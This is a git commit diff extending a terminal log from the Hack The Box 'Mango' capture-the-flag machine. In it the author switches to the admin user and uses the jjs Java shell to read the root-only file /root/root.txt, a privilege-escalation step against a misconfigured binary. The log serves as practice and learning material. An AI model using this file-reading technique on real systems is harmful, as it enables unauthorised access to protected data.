37edf8158d801875dc6e62c246b1b93c8076ba9d
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-04-15 19:22:48 -0400

    Update terminal1.bash

--- Mango/terminal1.bash
+++ Mango/terminal1.bash
@@ -128,8 +128,117 @@ $ ls
 user.txt
 $ cat user.txt  
 ********************************
-.
-.
-.
-// Aaaaand couldn't find root.txt :/
+$ ls -al
+total 24
+drwxr-xr-x 2 admin admin 4096 Sep 30  2019 .
+drwxr-xr-x 4 root  root  4096 Sep 27  2019 ..
+lrwxrwxrwx 1 admin admin    9 Sep 27  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 admin admin 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile
+-r-------- 1 admin admin   33 Sep 27  2019 user.txt
+$ cd ..
+$ ls
+admin  mango
+$ cd ..
+$ ls
+bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv       sys  usr  vmlinuz
+boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  swap.img  tmp  var  vmlinuz.old
+$ cd usr
+$ ls
+bin  games  include  lib  local  sbin  share  src
+$ cd lib
+$ ls
+accountsservice    dracut         initramfs-tools        libvgauth.so.0.0.0   openssh        rsyslog              tmpfiles.d
+apache2            eject          jvm                    libvmtools.so.0      open-vm-tools  sasl2                ubuntu-release-upgrader
+apt                environment.d  kernel                 libvmtools.so.0.0.0  os-prober      sftp-server          update-notifier
+binfmt.d           file           klibc                  linux                os-probes      snapd                valgrind
+byobu              gcc            language-selector      linux-boot-probes    os-release     software-properties  X11
+cgi-bin            git-core       libDeployPkg.so.0      locale               php            ssl                  x86_64-linux-gnu
+cloud-init         gnupg          libDeployPkg.so.0.0.0  lxcfs                pm-utils       sudo
+cnf-update-db      gnupg2         libguestlib.so.0       lxd                  policykit-1    sysctl.d
+command-not-found  groff          libguestlib.so.0.0.0   man-db               python2.7      systemd
+dbus-1.0           grub           libhgfs.so.0           mime                 python3        sysusers.d
+debug              grub-legacy    libhgfs.so.0.0.0       modules-load.d       python3.6      tar
+dpkg               initcpio       libvgauth.so.0         networkd-dispatcher  python3.7      tc
+$ exit
+mango@mango:/home/admin$ exit
+logout
+Connection to 10.10.10.162 closed.
+allenwest1@debian:~$ ssh admin@10.10.10.162
+admin@10.10.10.162's password: 
+Permission denied, please try again.
+admin@10.10.10.162's password: 
+Permission denied, please try again.
+admin@10.10.10.162's password: 
+
+allenwest1@debian:~$ ssh mango@10.10.10.162
+mango@10.10.10.162's password: 
+
+allenwest1@debian:~$ ssh admin@10.10.10.162
+admin@10.10.10.162's password: 
+Permission denied, please try again.
+admin@10.10.10.162's password: 
+
+allenwest1@debian:~$ ssh mango@10.10.10.162
+mango@10.10.10.162's password: 
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Apr 15 23:10:19 UTC 2020
+
+  System load:  0.02               Processes:            98
+  Usage of /:   25.8% of 19.56GB   Users logged in:      0
+  Memory usage: 14%                IP address for ens33: 10.10.10.162
+  Swap usage:   0%
+
+ * Kata Containers are now fully integrated in Charmed Kubernetes 1.16!
+   Yes, charms take the Krazy out of K8s Kata Kluster Konstruction.
+
+     https://ubuntu.com/kubernetes/docs/release-notes
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+122 packages can be updated.
+18 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Apr 15 23:04:05 2020 from 10.10.14.16
+mango@mango:~$ su admin
+Password: 
+$ cd usr
+sh: 1: cd: can't cd to usr
+$ cd ~/usr
+sh: 2: cd: can't cd to /home/admin//usr
+$ cd ..
+$ cd ..
+$ cd usr
+$ ls
+bin  games  include  lib  local  sbin  share  src
+$ cd lib 
+$ cd jvm
+$ ls
+java-1.11.0-openjdk-amd64  java-11-openjdk-amd64
+$ cd java-11-openjdk-amd64
+$ ls
+bin  conf  docs  legal  lib  man  release
+$ cd bin
+$ ls
+java  jjs  keytool  pack200  rmid  rmiregistry  unpack200
+$ ./jjs
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> var BufferedReader = Java.type("java.io.BufferedReader");
+jjs> var FileReader = Java.type("java.io.FileReader");
+jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
+jjs> while ((line = br.readLine()) != null) { print(line); }
+********************************
+jjs> exit
+
 
